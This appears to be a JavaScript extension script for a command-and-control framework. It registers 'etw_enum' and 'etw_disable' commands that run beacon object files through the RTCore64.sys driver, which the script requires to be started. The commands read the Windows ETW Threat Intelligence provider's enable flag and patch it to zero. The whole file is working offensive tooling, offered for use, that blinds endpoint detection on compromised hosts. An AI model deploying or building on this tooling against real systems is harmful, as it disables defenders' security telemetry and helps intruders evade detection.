var metadata = {
    name: "ETW-TI-BOF",
    description: "ETW Threat Intelligence provider enum/disable via RTCore64.sys."
};

// ============================================================================
// etw_enum
// ============================================================================

var cmd_etw_enum = ax.create_command("etw_enum",
    "Read PROVIDER_ENABLE_INFO.IsEnabled for the ETW-TI provider.\nRequires: sc start RTCore64",
    "etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}");

cmd_etw_enum.addArgString("guid", true, "ETW provider GUID e.g. {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}");

cmd_etw_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var guid = parsed_json["guid"] || "";
    if (guid === "") {
        ax.execute_alias(id, cmdline, `echo`, "Usage: etw_enum {GUID}", null);
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/etw_enum_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr", [guid]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: enum ETW-TI provider", null);
});

// ============================================================================
// etw_disable
// ============================================================================

var cmd_etw_disable = ax.create_command("etw_disable",
    "Patch PROVIDER_ENABLE_INFO.IsEnabled = 0 to disable ETW-TI provider.\nRequires: sc start RTCore64",
    "etw_disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}");

cmd_etw_disable.addArgString("guid", true, "ETW provider GUID e.g. {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}");

cmd_etw_disable.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var guid = parsed_json["guid"] || "";
    if (guid === "") {
        ax.execute_alias(id, cmdline, `echo`, "Usage: etw_disable {GUID}", null);
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/etw_disable_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr", [guid]);
    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: disable ETW-TI provider", null);
});

// ============================================================================
// Register group
// ============================================================================

var group_etw = ax.create_commands_group("Kernel Tradecraft", [
    cmd_etw_enum,
    cmd_etw_disable
]);
ax.register_commands_group(group_etw, ["beacon", "gopher", "kharon"], ["windows"], []);
